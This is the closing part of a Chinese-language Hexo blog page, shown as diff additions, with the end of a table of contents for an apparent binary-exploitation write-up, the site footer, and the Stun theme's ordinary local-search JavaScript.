+          sub_804A946()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#line-8"><span class="toc-number">1.3.3.</span> <span class="toc-text">
+          line 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#line-9"><span class="toc-number">1.3.4.</span> <span class="toc-text">
+          line 9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#line-10"><span class="toc-number">1.3.5.</span> <span class="toc-text">
+          line 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#line11"><span class="toc-number">1.3.6.</span> <span class="toc-text">
+          line11</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#while-s1"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">
+          while(s1)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#while-sub-804A8D7-dword-804D0AC"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">
+          while ( !sub_804A8D7(dword_804D0AC) )</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-poc"><span class="toc-number">1.4.</span> <span class="toc-text">
+          1.4 poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
+          2 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%94%B3%E8%AF%B7%E4%B8%8D%E9%87%8A%E6%94%BE%E7%9A%84%E5%A0%86%E7%A9%BA%E9%97%B4"><span class="toc-number">2.1.</span> <span class="toc-text">
+          2.1 申请不释放的堆空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-exp"><span class="toc-number">2.2.</span> <span class="toc-text">
+          2.2 exp</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
